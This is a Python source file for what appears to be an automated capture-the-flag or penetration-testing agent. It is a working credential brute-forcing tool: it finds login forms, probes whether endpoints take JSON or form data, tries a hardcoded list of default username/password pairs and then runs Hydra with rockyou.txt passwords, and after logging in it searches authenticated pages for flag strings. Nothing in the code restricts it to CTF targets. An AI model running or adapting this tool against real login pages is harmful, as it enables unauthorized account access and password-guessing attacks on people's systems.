"""
Fast credential testing using Hydra
"""
import asyncio
import subprocess
import re
from dataclasses import dataclass
from typing import List, Optional, Tuple
from urllib.parse import urlparse, urljoin
from pathlib import Path


@dataclass
class HydraResult:
    """Result from Hydra credential test"""
    success: bool
    username: Optional[str] = None
    password: Optional[str] = None
    host: str = ""
    port: int = 80
    raw_output: str = ""


# Top default credentials - these cover 90%+ of CTF/vulnerable apps
DEFAULT_CREDENTIALS = [
    # Most common defaults
    ("admin", "admin"),
    ("admin", "adminpass"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "password123"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("demo", "demo"),
    ("john", "password123"),
    ("test", "test"),
    ("user", "user"),
    ("user", "password"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("administrator", "admin"),
    # Web app specific
    ("admin", "admin@123"),
    ("admin", "P@ssw0rd"),
    ("webadmin", "webadmin"),
    ("tomcat", "tomcat"),
    ("manager", "manager"),
    # Database defaults
    ("sa", ""),
    ("sa", "sa"),
    ("postgres", "postgres"),
    ("mysql", "mysql"),
    # Common weak passwords
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "qwerty"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "changeme"),
]


class HydraTester:
    """Fast credential testing using Hydra"""

    def __init__(self, threads: int = 32, timeout: int = 120, use_full_wordlist: bool = True, password_limit: int = 100):
        """
        Args:
            threads: Number of parallel threads for Hydra
            timeout: Timeout in seconds
            use_full_wordlist: Use full wordlists (usernames.txt + rockyou.txt) or quick defaults
            password_limit: Max passwords from rockyou.txt (default 100, set to 0 for unlimited)
        """
        self.threads = threads
        self.timeout = timeout
        self.use_full_wordlist = use_full_wordlist
        self.password_limit = password_limit
        self.base_dir = Path(__file__).parent

    def _get_wordlists(self) -> Tuple[Path, Path]:
        """Get wordlist paths - either full or quick mode"""
        if self.use_full_wordlist:
            # Use full wordlists
            user_file = self.base_dir / "wordlists" / "usernames.txt"
            pass_file_src = self.base_dir / "wordlists" / "rockyou.txt"

            # Check if they exist
            if user_file.exists() and pass_file_src.exists():
                # If password limit is set, create a limited version
                if self.password_limit > 0:
                    pass_file = self.base_dir / "wordlists" / f"rockyou_top{self.password_limit}.txt"
                    with open(pass_file_src, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip()][:self.password_limit]
                    with open(pass_file, 'w') as f:
                        f.write('\n'.join(passwords))
                    return user_file, pass_file
                else:
                    return user_file, pass_file_src
            else:
                print("    [!] Full wordlists not found, falling back to quick mode")

        # Quick mode: use curated default credentials
        return self._create_quick_wordlists()

    def _create_quick_wordlists(self) -> Tuple[Path, Path]:
        """Create quick wordlist files from default credentials"""
        usernames = list(set(u for u, p in DEFAULT_CREDENTIALS))
        passwords = list(set(p for u, p in DEFAULT_CREDENTIALS))

        user_file = self.base_dir / "wordlists" / "quick_users.txt"
        pass_file = self.base_dir / "wordlists" / "quick_passwords.txt"

        # Ensure directory exists
        user_file.parent.mkdir(parents=True, exist_ok=True)

        with open(user_file, 'w') as f:
            f.write('\n'.join(usernames))

        with open(pass_file, 'w') as f:
            f.write('\n'.join(passwords))

        return user_file, pass_file

    def _parse_url(self, url: str) -> Tuple[str, int, str, bool]:
        """Parse URL into host, port, path, is_https"""
        parsed = urlparse(url)
        host = parsed.hostname or parsed.netloc
        is_https = parsed.scheme == 'https'
        port = parsed.port or (443 if is_https else 80)
        path = parsed.path or "/"
        return host, port, path, is_https

    def _build_hydra_command(
        self,
        host: str,
        port: int,
        path: str,
        is_https: bool,
        username_field: str,
        password_field: str,
        method: str,
        failure_string: str,
        user_file: Path,
        pass_file: Path,
        additional_fields: dict = None
    ) -> List[str]:
        """Build the Hydra command"""

        # Build form data string
        form_data = f"{username_field}=^USER^&{password_field}=^PASS^"
        if additional_fields:
            for key, value in additional_fields.items():
                form_data += f"&{key}={value}"

        # Determine service type
        if method.upper() == "GET":
            service = "https-get-form" if is_https else "http-get-form"
        else:
            service = "https-post-form" if is_https else "http-post-form"

        # Build form spec: path:data:failure_condition
        form_spec = f"{path}:{form_data}:F={failure_string}"

        cmd = [
            "hydra",
            "-L", str(user_file),
            "-P", str(pass_file),
            "-t", str(self.threads),
            "-f",  # Exit on first valid password
            "-o", "-",  # Output to stdout
            "-s", str(port),
            host,
            service,
            form_spec
        ]

        return cmd

    def _parse_hydra_output(self, output: str) -> HydraResult:
        """Parse Hydra output to extract credentials"""

        # Hydra success pattern: [80][http-post-form] host:   login: admin   password: admin
        pattern = r'\[(\d+)\]\[[\w-]+\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S*)'
        match = re.search(pattern, output)

        if match:
            port = int(match.group(1))
            host = match.group(2)
            username = match.group(3)
            password = match.group(4)

            return HydraResult(
                success=True,
                username=username,
                password=password,
                host=host,
                port=port,
                raw_output=output
            )

        # Also check for simpler pattern
        simple_pattern = r'login:\s*(\S+)\s+password:\s*(\S*)'
        match = re.search(simple_pattern, output)
        if match:
            return HydraResult(
                success=True,
                username=match.group(1),
                password=match.group(2),
                raw_output=output
            )

        return HydraResult(success=False, raw_output=output)

    async def test_form(
        self,
        target_url: str,
        form_action: str,
        method: str,
        username_field: str,
        password_field: str,
        additional_fields: dict = None,
        failure_string: str = "Invalid|incorrect|failed|error|denied|wrong"
    ) -> HydraResult:
        """
        Test a login form using Hydra

        Args:
            target_url: Base URL of the target
            form_action: Form action URL
            method: HTTP method (GET/POST)
            username_field: Name of username field
            password_field: Name of password field
            additional_fields: Other form fields to include
            failure_string: String indicating login failure

        Returns:
            HydraResult with credentials if found
        """
        # Parse URLs
        host, port, base_path, is_https = self._parse_url(target_url)

        # Get form path
        if form_action.startswith('http'):
            _, _, form_path, _ = self._parse_url(form_action)
        else:
            form_path = form_action if form_action.startswith('/') else f"/{form_action}"

        # Get wordlists (full or quick mode)
        user_file, pass_file = self._get_wordlists()

        # Count credentials for display
        with open(user_file) as f:
            num_users = sum(1 for _ in f)
        with open(pass_file) as f:
            num_passwords = sum(1 for _ in f)

        # Build command
        cmd = self._build_hydra_command(
            host=host,
            port=port,
            path=form_path,
            is_https=is_https,
            username_field=username_field,
            password_field=password_field,
            method=method,
            failure_string=failure_string,
            user_file=user_file,
            pass_file=pass_file,
            additional_fields=additional_fields
        )

        total_combos = num_users * num_passwords
        print(f"\n[*] Running Hydra ({self.threads} threads)...")
        print(f"    Target: {host}:{port}{form_path}")
        print(f"    Usernames: {num_users}, Passwords: {num_passwords}")
        print(f"    Total combinations: {total_combos}")
        print(f"    Method: {method.upper()}")
        print(f"    Fields: {username_field}, {password_field}")

        try:
            # Run Hydra
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=self.timeout
                )
            except asyncio.TimeoutError:
                process.kill()
                print(f"    [!] Hydra timed out after {self.timeout}s")
                return HydraResult(success=False, raw_output="Timeout")

            output = stdout.decode('utf-8', errors='ignore')
            error = stderr.decode('utf-8', errors='ignore')

            # Parse result
            result = self._parse_hydra_output(output)

            if result.success:
                print(f"\n    [+] SUCCESS! Found credentials:")
                print(f"        Username: {result.username}")
                print(f"        Password: {result.password}")
            else:
                print(f"    [-] No valid credentials found")
                if "Error" in error:
                    print(f"    [!] Hydra error: {error[:200]}")

            return result

        except FileNotFoundError:
            print("    [!] Hydra not found. Install with: apt-get install hydra")
            return HydraResult(success=False, raw_output="Hydra not installed")
        except Exception as e:
            print(f"    [!] Error running Hydra: {e}")
            return HydraResult(success=False, raw_output=str(e))


async def detect_endpoint_type(form_action: str, username_field: str, password_field: str) -> dict:
    """
    Probe the endpoint to detect what format it expects
    Returns: {'type': 'json'|'form'|'unknown', 'content_type': str, 'failure_indicator': str}
    """
    import aiohttp

    result = {
        'type': 'unknown',
        'content_type': 'application/x-www-form-urlencoded',
        'failure_indicator': 'invalid',
        'success_indicator': 'token'
    }

    # Heuristic 1: Endpoint name suggests API
    api_indicators = ['/token', '/api/', '/auth', '/oauth', '/jwt', '/login/api', '/v1/', '/v2/']
    if any(ind in form_action.lower() for ind in api_indicators):
        result['type'] = 'json'
        result['content_type'] = 'application/json'

    # Heuristic 2: Probe with test requests to see what format is ACCEPTED
    async with aiohttp.ClientSession() as session:

        # Try form-urlencoded FIRST (most common, including OAuth2 /token endpoints)
        try:
            async with session.post(
                form_action,
                data={username_field: 'test', password_field: 'test'},
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                status = resp.status
                text = await resp.text()
                text_lower = text.lower()

                # 422 = format rejected, try other format
                # 400/401/403 with proper error = format accepted
                if status != 422:
                    result['type'] = 'form'
                    result['content_type'] = 'application/x-www-form-urlencoded'

                    # Extract failure indicator
                    for indicator in ['invalid', 'incorrect', 'unauthorized', 'failed', 'error', 'denied', 'wrong']:
                        if indicator in text_lower:
                            result['failure_indicator'] = indicator
                            break

                    # Check for success indicators in response structure
                    if 'token' in text_lower:
                        result['success_indicator'] = 'token'
                    elif 'access' in text_lower:
                        result['success_indicator'] = 'access'

                    return result
        except:
            pass

        # Try JSON if form-urlencoded was rejected
        try:
            async with session.post(
                form_action,
                json={username_field: 'test', password_field: 'test'},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                status = resp.status
                text = await resp.text()
                text_lower = text.lower()

                if status != 422:
                    result['type'] = 'json'
                    result['content_type'] = 'application/json'

                    # Extract failure indicator
                    for indicator in ['invalid', 'incorrect', 'unauthorized', 'failed', 'error', 'denied']:
                        if indicator in text_lower:
                            result['failure_indicator'] = indicator
                            break

                    if 'token' in text_lower:
                        result['success_indicator'] = 'token'
                    elif 'access' in text_lower:
                        result['success_indicator'] = 'access'

                    return result
        except:
            pass

    return result


async def test_credentials_http(form_action: str, username_field: str, password_field: str,
                                 credentials: List[Tuple[str, str]], endpoint_type: dict,
                                 verbose: bool = False) -> Optional[Tuple[str, str]]:
    """
    Test credentials using direct HTTP requests with detected format
    """
    import aiohttp

    is_json = endpoint_type['type'] == 'json'
    failure_indicator = endpoint_type['failure_indicator']
    success_indicator = endpoint_type['success_indicator']

    tested = 0
    async with aiohttp.ClientSession() as session:
        for username, password in credentials:
            tested += 1
            try:
                if is_json:
                    payload = {
                        'json': {username_field: username, password_field: password},
                        'headers': {'Content-Type': 'application/json'}
                    }
                else:
                    payload = {
                        'data': {username_field: username, password_field: password},
                        'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
                    }

                async with session.post(form_action, **payload, timeout=aiohttp.ClientTimeout(total=5), allow_redirects=False) as resp:
                    status = resp.status
                    text = await resp.text()
                    text_lower = text.lower()

                    if verbose or (username == 'demo' and password == 'demo'):
                        print(f"      [{tested}] {username}:{password} -> {status} | {text[:100]}...")

                    # Check for success - redirects indicate successful login
                    if status in [301, 302, 303]:
                        return (username, password)

                    # Check for success with 200 response
                    if status == 200:
                        # FIRST check for failure indicators - these always mean failure
                        has_failure = (failure_indicator in text_lower or
                                      'incorrect' in text_lower or
                                      'invalid' in text_lower or
                                      'wrong' in text_lower or
                                      'denied' in text_lower or
                                      'failed' in text_lower)

                        if has_failure:
                            # Definitely a failed login, skip
                            continue

                        # No failure indicators - check for success indicators (JSON API responses)
                        # Be specific: look for actual token values, not just "token" in HTML
                        if 'access_token' in text_lower or '"token"' in text_lower or 'bearer' in text_lower:
                            return (username, password)

                        # 200 with no failure indicators and reasonable response = success
                        # (some apps return 200 with dashboard/welcome page on success)
                        if len(text) > 100:  # Not an empty or error page
                            return (username, password)
            except Exception as e:
                if verbose:
                    print(f"      [{tested}] {username}:{password} -> ERROR: {e}")
                continue

            # Progress indicator
            if tested % 10 == 0:
                print(f"      Tested {tested}/{len(credentials)}...", end='\r')

    print(f"      Tested {tested}/{len(credentials)} combinations")
    return None


async def test_default_credentials_hydra(target_url: str) -> dict:
    """
    Test for default credentials using HTTP requests + Hydra fallback

    Returns dict with:
        - success: bool
        - credentials: list of found credentials
        - message: status message
    """
    from src.credential_agent.form_detector import FormDetector
    from playwright.async_api import async_playwright

    print("=" * 70)
    print("DEFAULT CREDENTIALS TEST")
    print("=" * 70)
    print(f"Target: {target_url}")
    print()

    # Step 1: Detect login forms
    print("[1] Detecting login forms...")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        try:
            await page.goto(target_url, wait_until="load", timeout=30000)
            html = await page.content()
            # Get final URL after redirects (important for form action resolution)
            final_url = page.url
            await browser.close()
        except Exception as e:
            await browser.close()
            return {
                'success': False,
                'credentials': [],
                'message': f"Failed to load page: {e}"
            }

    print(f"    Page loaded ({len(html)} chars)")

    # Detect forms - use final URL after redirects for correct form action
    detector = FormDetector()
    forms = detector.find_login_forms(html, final_url)

    if not forms:
        print("    No login forms detected")
        return {
            'success': False,
            'credentials': [],
            'message': "No login forms found"
        }

    print(f"    Found {len(forms)} login form(s)")

    # Step 2: Test each form with Hydra (progressive strategy)
    # Stage 1: Top 200 passwords (quick)
    # Stage 2: Full 3200 if stage 1 fails (thorough)

    found_credentials = []

    for idx, form in enumerate(forms, 1):
        print(f"\n[2] Testing form {idx}/{len(forms)}")
        print(f"    Action: {form.action}")
        print(f"    Method: {form.method}")
        print(f"    Username field: {form.username_field}")
        print(f"    Password field: {form.password_field}")

        # Step 0: Detect endpoint type (JSON API vs form)
        print(f"\n    🔍 Detecting endpoint type...")
        endpoint_type = await detect_endpoint_type(
            form_action=form.action,
            username_field=form.username_field,
            password_field=form.password_field
        )
        print(f"    Detected: {endpoint_type['type'].upper()} endpoint")
        print(f"    Content-Type: {endpoint_type['content_type']}")
        print(f"    Failure indicator: '{endpoint_type['failure_indicator']}'")

        # Stage 1: Quick scan with common defaults (~30 pairs)
        print(f"\n    📍 Stage 1: Testing common defaults ({len(DEFAULT_CREDENTIALS)} pairs)...")
        http_result = await test_credentials_http(
            form_action=form.action,
            username_field=form.username_field,
            password_field=form.password_field,
            credentials=DEFAULT_CREDENTIALS,
            endpoint_type=endpoint_type
        )

        if http_result:
            print(f"\n    [+] SUCCESS! Found credentials:")
            print(f"        Username: {http_result[0]}")
            print(f"        Password: {http_result[1]}")
            found_credentials.append({
                'username': http_result[0],
                'password': http_result[1],
                'form_action': form.action
            })
            continue  # Found it, skip stage 2

        print(f"    [-] No match in common defaults")

        # Stage 2: Full scan (~3200 combinations = 32 users × 100 passwords)
        print(f"\n    📍 Stage 2: Full scan (~3200 combinations)...")
        tester_full = HydraTester(threads=32, timeout=120, password_limit=100)

        result = await tester_full.test_form(
            target_url=target_url,
            form_action=form.action,
            method=form.method,
            username_field=form.username_field,
            password_field=form.password_field,
            additional_fields=form.additional_fields
        )

        if result.success:
            found_credentials.append({
                'username': result.username,
                'password': result.password,
                'form_action': form.action
            })

    # Post-login flag check: Login with found credentials and check common pages for flags
    flag_found = None
    if found_credentials:
        print("\n[3] Checking for flags in authenticated pages...")
        print(f"    Found {len(found_credentials)} credential(s) to check", flush=True)
        import re
        import aiohttp
        flag_pattern = re.compile(r'(FLAG\{[^}]+\}|XBEN\{[^}]+\}|CTF\{[^}]+\})', re.IGNORECASE)

        for cred in found_credentials:
            print(f"    Testing {cred.get('username', '?')}:{cred.get('password', '?')} on {cred.get('form_action', '?')}", flush=True)
            try:
                jar = aiohttp.CookieJar()
                timeout = aiohttp.ClientTimeout(total=15)
                async with aiohttp.ClientSession(cookie_jar=jar, timeout=timeout) as session:
                    # Login
                    login_data = {
                        'username': cred['username'],
                        'password': cred['password']
                    }
                    print(f"    Logging in as {cred['username']}...", flush=True)
                    async with session.post(cred['form_action'], data=login_data, allow_redirects=True) as resp:
                        html = await resp.text()
                        final_url = str(resp.url)
                        print(f"    Login response: status={resp.status}, url={final_url}, len={len(html)}")

                        # Check login page redirect for flag
                        match = flag_pattern.search(html)
                        if match:
                            flag_found = match.group(1)
                            print(f"    🚩 FLAG FOUND after login: {flag_found}")
                            cred['flag'] = flag_found
                            break

                    if not flag_found:
                        # Check common authenticated pages
                        check_pages = ['/profile', '/dashboard', '/admin', '/home', '/account', '/']
                        parsed = urlparse(target_url)
                        base_url = f"{parsed.scheme}://{parsed.netloc}"

                        for page in check_pages:
                            try:
                                async with session.get(f"{base_url}{page}", allow_redirects=True) as resp:
                                    html = await resp.text()
                                    print(f"    Checking {page}: len={len(html)}")
                                    match = flag_pattern.search(html)
                                    if match:
                                        flag_found = match.group(1)
                                        print(f"    🚩 FLAG FOUND on {page}: {flag_found}")
                                        cred['flag'] = flag_found
                                        break
                            except Exception as page_err:
                                print(f"    Error on {page}: {page_err}")
                                continue

                        if flag_found:
                            break
            except Exception as e:
                print(f"    Post-login check error: {e}")
                import traceback
                traceback.print_exc()

    # Summary
    print("\n" + "=" * 70)
    if found_credentials:
        print("SUCCESS! Found valid credentials:")
        for cred in found_credentials:
            print(f"  - {cred['username']}:{cred['password']}")
            if cred.get('flag'):
                print(f"    🚩 FLAG: {cred['flag']}")
    else:
        print("No default credentials found")
    print("=" * 70)

    return {
        'success': len(found_credentials) > 0,
        'credentials': found_credentials,
        'flag': flag_found,
        'message': f"Found {len(found_credentials)} valid credential(s)" if found_credentials else "No default credentials found"
    }
